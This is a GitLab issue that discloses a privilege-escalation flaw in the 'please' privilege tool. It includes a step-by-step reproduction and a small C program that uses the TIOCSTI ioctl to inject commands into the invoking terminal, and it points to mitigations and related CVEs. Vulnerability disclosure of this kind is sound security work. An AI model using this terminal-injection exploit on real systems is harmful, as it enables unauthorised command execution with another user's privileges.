

[Skip to content](#content-body)
GitLab

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# [Git master] Vulnerable to privilege escalation using ioctls TIOCSTI and TIOCLINUX

Hi!

I believe that `please` is vulnerabily to privilege escalation using ioctls `TIOCSTI` and `TIOCLINUX`. Here is how to see it in action:

```
$ cd "$(mktemp -d)"
$ git clone --depth 1 https://gitlab.com/edneville/please.git
$ cd please/
$ git rev-parse HEAD  # f3598f8fae5455a8ecf22afca19eaba7be5053c9
$ cargo test && cargo build --release
$ echo "[${USER}_as_nobody]"$'\nname='"${USER}"$'\ntarget=nobody\nrule=.*\nrequire_pass=false' | sudo tee /etc/please.ini
$ sudo chown root:root ./target/release/please
$ sudo chmod u+s ./target/release/please
$ cat <<TIOCSTI_C_EOF | tee TIOCSTI.c
#include <sys/ioctl.h>

int main(void) {
  const char *text = "id\n";
  while (*text)
    ioctl(0, TIOCSTI, text++);
  return 0;
}
TIOCSTI_C_EOF
$ gcc -std=c99 -Wall -Wextra -pedantic -o /tmp/TIOCSTI TIOCSTI.c
$ ./target/release/please -u nobody /tmp/TIOCSTI  # runs id(1) as ${USER} rather than nobody
```

Please note that:

* This affects both the case where root wants to drop privileges as well when non-root wants to gain other privileges.
* [ttyjack](https://github.com/jwilk/ttyjack) allows playing with `TIOCSTI` and `TIOCLINUX` comfortably.
* Of the three known options for counter measures, use of a PTY is currently considered the best solution.
* For a list of other software known affected by this issue see <https://github.com/hartwork/antijack#related-cves-not-mine> .
* The code above is inspired by <https://github.com/containers/bubblewrap/issues/142> .

Best, Sebastian

Edited Apr 29, 2023 by [Sebastian Pipping](/sping)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.

